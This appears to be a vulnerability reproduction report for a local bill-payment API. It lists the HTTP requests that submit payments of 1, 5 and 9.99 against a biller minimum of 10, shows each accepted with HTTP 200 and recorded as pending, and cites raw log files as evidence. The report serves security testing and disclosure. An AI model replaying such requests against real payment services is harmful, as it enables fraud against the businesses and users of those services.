1. GET http://127.0.0.1:5000/api/billers/by-category/1 -> first biller: {"name":"City Water Utility","minimum_amount":10.0,"maximum_amount":null}
2. As an authenticated user POST /api/bill-payments/create {"biller_id":1,"amount":1,"payment_method":"balance"} -> HTTP 200 'Payment processed successfully'
3. Repeat with 5.0 and 9.99, both accepted below the stated minimum
4. GET /api/bill-payments/history shows the out-of-policy payments recorded ("amount": 9.99 ... "status": "pending")
evidence:
biller constraint: min 10.0, max None
amount=1 -> 200 'Payment processed successfully'; amount=5 -> 200; amount=9.99 -> 200
Stored in history: {"amount":9.99,"biller_name":"City Water","category_name":"Utilities","status":"pending"}
Raw output: artifacts/vb/card_massassign.log, artifacts/vb/extra_endpoints.log
